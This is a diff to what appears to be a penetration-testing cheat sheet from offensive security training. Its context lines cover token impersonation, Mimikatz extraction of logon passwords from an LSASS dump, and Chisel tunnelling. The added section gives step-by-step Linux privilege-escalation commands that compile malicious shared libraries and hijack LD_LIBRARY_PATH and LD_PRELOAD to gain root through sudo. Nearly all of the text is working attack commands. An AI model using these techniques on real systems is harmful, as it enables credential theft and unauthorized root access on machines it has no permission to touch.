@@ -13,14 +13,12 @@ list_tokens -u
 impersonate_token corp1\\admin
 getuid
 ```
-
 ## MiniDump
 ```powershell
 #MiniDump.exe
 sekurlsa::minidump lsass.dmp
 sekurlsa::logonpasswords
 ```
-
 # Network 
 
 ## Chisel Tunnel
@@ -33,4 +31,24 @@ sekurlsa::logonpasswords
 
 #Server Side
 proxychains4 nmap [IP Address]
+```
+# Linux Command Injection 
+
+## LD_LIBRARY_PATH Hijacking
+Logic: Use LDD to find libgpg-error.so.0 → Use readelf to grep needed variable → Put into "Linux Shellcode Loaders/sharedLibrary_LD_LIBRARY_PATH.c" → Export the library path and Execute
+```bash
+ldd /usr/bin/top //Find out libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007ff5aa0f8000)
+readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
+gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_LIBRARY_PATH.o sharedLibrary_LD_LIBRARY_PATH.c
+gcc -shared -o sharedLibrary_LD_LIBRARY_PATH.so sharedLibrary_LD_LIBRARY_PATH.o -ldl
+export LD_LIBRARY_PATH=/home/offsec/ldlib/
+sudo top
+```
+
+## LD_PRELOAD
+Logic: Use ltrace cp → find out the cp command use getuid → set LD_PRELOAD to hijack the function
+```bash
+gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_PRELOAD.o sharedLibrary_LD_PRELOAD.c
+gcc -shared -o sharedLibrary_LD_PRELOAD.so sharedLibrary_LD_PRELOAD.o -ldl
+export LD_PRELOAD=/home/offsec/evil_geteuid.so
 ```
